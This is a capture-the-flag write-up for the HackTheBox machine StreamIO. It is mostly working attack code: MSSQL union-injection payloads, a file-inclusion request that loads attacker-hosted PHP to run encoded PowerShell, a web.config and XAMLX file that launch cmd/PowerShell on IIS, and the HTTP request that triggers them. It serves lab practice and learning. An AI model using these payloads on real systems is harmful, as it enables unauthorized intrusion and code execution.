---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/3utO6ys2Rhg/0.jpg
layout: post
media_subpath: /assets/posts/2022-09-17-sqli-lfi-to-rce-xamlx-impersonation-streamio-hackthebox
tags:
- active directory
- hackthebox
- seimpersonate
- sql injection
- windows
title: SQLi,  LFI to RCE and Unintended Privesc via XAMLX & Impersonation –
  StreamIO @ HackTheBox
---

Additional notes for StreamIO, a medium difficulty Windows machine on HackTheBox that involves manual MSSQL Injection, going from file inclusion to RCE and in this case getting the SeImpersonate privilege back to get SYSTEM via an EFS-based potato.

{% youtube 3utO6ys2Rhg %}

## Notes

**SQLi**

```
q=admin' union select 1,2,3,4,5-- 
q=admin' union select 1,2,3,4,5,6-- 
q=admin' union select 1,@@version,3,4,5,6--  
q=admin' union select 1, STRING_AGG(name, ', '),3,4,5,6 from master..sysdatabases--
q=admin' union select 1, STRING_AGG(name, ', '),3,4,5,6 from  master..sysobjects WHERE xtype = 'U'--
q=admin' union select 1, STRING_AGG(CONCAT(table_name,'.',column_name), ', '),3,4,5,6 from  information_schema.columns--
```

**RCE**

```
# Content of "x", hosted on the attacker machine
system("powershell -exec bypass -enc JAB...");

# Request
curl -H 'Cookie: PHPSESSID=r3apd30esr2a8c1kt0vfnmd6qn' -sk -X POST -d 'include=http://10.10.14.9/x' https://streamio.htb/admin/?debug=master.php
```

**XAMLX & Web.config to RCE**

[Getting Shells with XAMLX Files](https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
 <system.webServer>
 <handlers accessPolicy="Read, Script, Write">
 <add name="xamlx" path="*.xamlx" verb="*" type="System.Xaml.Hosting.XamlHttpHandlerFactory, System.Xaml.Hosting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" modules="ManagedPipelineHandler" requireAccess="Script" preCondition="integratedMode" />
 <add name="xamlx-Classic" path="*.xamlx" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" requireAccess="Script" preCondition="classicMode,runtimeVersionv4.0,bitness64" />
 </handlers>
 <validation validateIntegratedModeConfiguration="false" />
 </system.webServer>
</configuration>
```

**Shell.xaml**

```xml
<WorkflowService ConfigurationName="Service1" Name="Service1" xmlns="http://schemas.microsoft.com/netfx/2009/xaml/servicemodel" xmlns:p="http://schemas.microsoft.com/netfx/2009/xaml/activities" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:p1="http://schemas.microsoft.com/netfx/2009/xaml/activities" >
 <p:Sequence DisplayName="Sequential Service">
 <TransactedReceiveScope Request="{x:Reference __r0}">
 <p1:Sequence >
 <SendReply DisplayName="SendResponse" >
 <SendReply.Request>
 <Receive x:Name="__r0" CanCreateInstance="True" OperationName="SubmitPurchasingProposal" Action="testme" />
 </SendReply.Request>
 <SendMessageContent>
 <p1:InArgument x:TypeArguments="x:String">[System.Diagnostics.Process.Start("cmd.exe", "/c powershell -exec bypass -enc JAB...").toString()]</p1:InArgument>
 </SendMessageContent>
 </SendReply>
 </p1:Sequence>
 </TransactedReceiveScope>
 </p:Sequence>
</WorkflowService>
```

**Trigger**

```
POST /test.xamlx HTTP/1.1
Host: 10.10.11.158
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
SOAPAction: testme
Content-Length: 88

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body/></s:Envelope>
```

## Resources

- <https://github.com/CCob/SweetPotato>